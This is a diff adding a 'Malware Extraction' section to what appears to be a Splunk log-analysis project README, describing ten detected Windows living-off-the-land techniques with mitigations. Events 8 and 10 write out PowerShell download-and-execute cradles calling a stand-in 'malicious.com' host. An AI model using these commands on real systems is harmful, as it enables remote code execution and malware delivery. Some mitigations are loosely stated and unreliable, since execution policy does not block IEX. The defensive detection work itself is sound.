@@ -94,7 +94,92 @@ Mitigation recommendations:
 - Audit files accessed and transferred during this period.
 - Block rclone.exe execution if unauthorized.
 
+# Malware Extraction
 
+![(MalwareExtraction](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d41bd6835f550b652f19fd4bf418c4c10a86ca24/assets/malware-ex.png)
+
+Event 1: Using regsvr32.exe for remote execution
+The execution of regsvr32.exe was detected with the /i parameter pointing to a remote script (.sct), suggesting the use of Regsvr32 Bypass.
+It allows remote code execution without writing files to disk.
+
+Mitigation:
+- Block regsvr32.exe in AppLocker or WDAC.
+- Monitor processes with regsvr32.exe and external URLs in Splunk.
+
+Event 2: Creating a malicious scheduled task with schtasks.exe
+A scheduled task was identified that executes a PowerShell script to download a backdoor.
+Malware persistence and automatic execution.
+
+Mitigation:
+- Restrict task creation with administrative permissions.
+- Monitor schtasks.exe by running PowerShell with URLs.
+
+Event 3: Using wmic.exe to Execute PowerShell
+The use of wmic process call create was detected to execute a malicious script in PowerShell.
+Remote execution without requiring elevated privileges.
+
+Mitigation:
+- Block wmic.exe in environments where it is not needed.
+- Monitor wmic process call create commands.
+
+Event 4: Malicious Code Execution in DLLs with rundll32.exe
+Using rundll32.exe to load and execute code from a suspicious DLL.
+Allows malicious code execution without signature detection.
+
+Mitigation:
+- Block rundll32.exe with AppLocker if not needed.
+- Identify suspicious DLLs loaded in C:\Windows\Temp\.
+
+Event 5: PowerShell loading code into memory (Base64 Encoded Payload) with powershell.exe
+A Base64-encoded payload was detected executing directly in memory.
+Evades traditional antivirus solutions.
+
+Mitigation:
+- Enable PowerShell logs (4103, 4104).
+- Block -EncodedCommand in execution policies.
+
+Event 6: Malicious JavaScript execution with wscript.exe
+A .js script was executed from C:\Users\Public\malicious.js.
+Possible malware delivery or persistence.
+
+Mitigation:
+- Block .js and .vbs script execution with GPO.
+- Monitor wscript.exe.
+
+Event 7: Use of mshta.exe for remote execution
+Mshta.exe was used to download and execute a malicious HTA file.
+Allows remote execution without UAC restrictions.
+
+Mitigation:
+- Block mshta.exe in AppLocker.
+- Monitor outgoing connections to mshta.exe.
+
+Event 8: Downloading and executing code with Invoke-Expression (IEX) using powershell.exe
+Using IEX (New-Object Net.WebClient).DownloadString('http://malicious.com').
+Remote execution without writing to disk.
+
+Mitigation:
+- Enforce safe execution policies in PowerShell.
+- Block IEX in scripts with Set-ExecutionPolicy Restricted.
+
+Event 9: Downloading malware with certutil.exe
+Certutil.exe downloaded an executable from the internet and executed it.
+Allows malware to be downloaded and executed without raising suspicion.
+
+Mitigation:
+- Block certutil.exe in GPO or AppLocker.
+- Monitor executable file downloads with certutil.
+
+Event 10: PowerShell executing remote code with suspicious parameters
+Powershell -NoP -Ep Bypass -c IEX (New-Object Net.WebClient).DownloadString(...).
+Malware execution without security restrictions.
+
+Mitigation:
+- Restrict PowerShell with -NoP -Ep Bypass in corporate environments.
+- Enable event logs (4688, 4104).
+
+
+# Privilege Escalation
 
 
 
